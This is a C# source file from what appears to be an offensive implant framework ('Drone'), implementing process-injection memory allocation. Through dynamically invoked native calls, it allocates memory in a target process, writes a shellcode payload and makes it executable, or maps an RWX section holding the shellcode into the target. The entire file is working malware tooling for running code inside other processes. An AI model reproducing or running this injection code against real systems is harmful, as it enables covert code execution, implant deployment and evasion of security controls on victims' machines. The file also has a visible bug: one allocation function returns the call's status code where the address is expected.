using System;
using System.Collections.Generic;
using System.Linq;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Drone.Invocation.Data;

namespace Drone.Invocation.Injection
{
    public abstract class AllocationTechnique
    {
        protected abstract IEnumerable<Type> SupportedPayloads { get; }

        public virtual bool IsSupportedPayloadType(PayloadType payload)
            => SupportedPayloads.Contains(payload.GetType());

        public abstract IntPtr Allocate(PayloadType payload, Process process);
    }

    public class NtWriteVirtualMemory : AllocationTechnique
    {
        protected override IEnumerable<Type> SupportedPayloads { get; }
            = new[] { typeof(PICPayload) };
        
        public override IntPtr Allocate(PayloadType payload, Process process)
        {
            var baseAddress = AllocateMemory(payload.Payload, process.Handle);
            
            if (!WriteMemory(payload.Payload, process.Handle, baseAddress))
                throw new Exception("Failed to write process memory");
            
            ChangeMemPermission(process.Handle, baseAddress, payload.Payload.Length);
            
            return baseAddress;
        }

        private IntPtr AllocateMemory(byte[] payload, IntPtr hProcess)
        {
            var baseAddress = IntPtr.Zero;
            var regionSize = (IntPtr)payload.Length;

            var result = DynamicInvoke.Native.NtAllocateVirtualMemory(
                hProcess,
                ref baseAddress,
                IntPtr.Zero,
                ref regionSize,
                0x1000 | 0x2000,
                0x04);

            return result;
        }

        private bool WriteMemory(byte[] payload, IntPtr hProcess, IntPtr baseAddress)
        {
            var buffer = Marshal.AllocHGlobal(payload.Length);
            Marshal.Copy(payload, 0, buffer, payload.Length);

            var result = DynamicInvoke.Native.NtWriteVirtualMemory(
                hProcess,
                baseAddress,
                buffer,
                (uint)payload.Length);

            return result > 0;
        }

        private void ChangeMemPermission(IntPtr hProcess, IntPtr baseAddress, int length)
        {
            var regionSize = (IntPtr)length;
            
            DynamicInvoke.Native.NtProtectVirtualMemory(
                hProcess,
                ref baseAddress,
                ref regionSize,
                0x20);
        }
    }
    
    public class NtMapViewOfSection : AllocationTechnique
    {
        protected override IEnumerable<Type> SupportedPayloads { get; }
            = new[] { typeof(PICPayload) };

        private const uint LocalSectionPermissions = Win32.WinNT.PAGE_EXECUTE_READWRITE;
        private const uint RemoteSectionPermissions = Win32.WinNT.PAGE_EXECUTE_READWRITE;
        private const uint SectionAttributes = Win32.WinNT.SEC_COMMIT;

        public override IntPtr Allocate(PayloadType payload, Process process)
        {
            // Get a convenient handle for the target process.
            var hProcess = process.Handle;
            
            // Get handle to current process
            var hSelf = Process.GetCurrentProcess().Handle;

            // Create a section to hold our payload
            var sectionAddress = CreateSection((uint)payload.Payload.Length, SectionAttributes);

            // Map a view of the section into our current process with RW permissions
            var details = MapSection(
                hSelf,
                sectionAddress,
                LocalSectionPermissions,
                IntPtr.Zero,
                Convert.ToUInt32(payload.Payload.Length));

            // Copy the shellcode to the local view
            Marshal.Copy(payload.Payload, 0, details.BaseAddress, payload.Payload.Length);

            // Now that we are done with the mapped view in our own process, unmap it
            var result = UnmapSection(
                hSelf,
                details.BaseAddress);

            // Now, map a view of the section to other process. It should already hold the payload.
            var newDetails = MapSection(
                hProcess,
                sectionAddress,
                RemoteSectionPermissions,
                IntPtr.Zero,
                (ulong)payload.Payload.Length);
            
            return newDetails.BaseAddress;
        }

        private static IntPtr CreateSection(ulong size, uint allocationAttributes)
        {
            // Create a pointer for the section handle
            var sectionHandle = new IntPtr();
            var maxSize = size;

            var result = DynamicInvoke.Native.NtCreateSection(
                ref sectionHandle,
                0x10000000,
                IntPtr.Zero,
                ref maxSize,
                Win32.WinNT.PAGE_EXECUTE_READWRITE,
                allocationAttributes,
                IntPtr.Zero);

            // Perform error checking on the result
            return result < 0 ? IntPtr.Zero : sectionHandle;
        }

        private static SectionDetails MapSection(IntPtr hProcess, IntPtr hSection, uint protection, IntPtr addr, ulong sizeData)
        {
            // Copied so that they may be passed by reference but the original value preserved
            var baseAddr = addr;
            var size = sizeData;

            const uint disp = 2;
            const uint alloc = 0;

            var result = DynamicInvoke.Native.NtMapViewOfSection(
                hSection, 
                hProcess,
                ref baseAddr,
                IntPtr.Zero, 
                IntPtr.Zero, 
                IntPtr.Zero,
                ref size, 
                disp, 
                alloc,
                protection);

            // Create a struct to hold the results.
            var details = new SectionDetails(baseAddr, sizeData);

            return details;
        }

        private readonly struct SectionDetails
        {
            public readonly IntPtr BaseAddress;
            public readonly ulong Size;

            public SectionDetails(IntPtr address, ulong size)
            {
                BaseAddress = address;
                Size = size;
            }
        }
        
        private static Native.NTSTATUS UnmapSection(IntPtr hProcess, IntPtr baseAddress)
        {
            return DynamicInvoke.Native.NtUnmapViewOfSection(hProcess, baseAddress);
        }
    }
}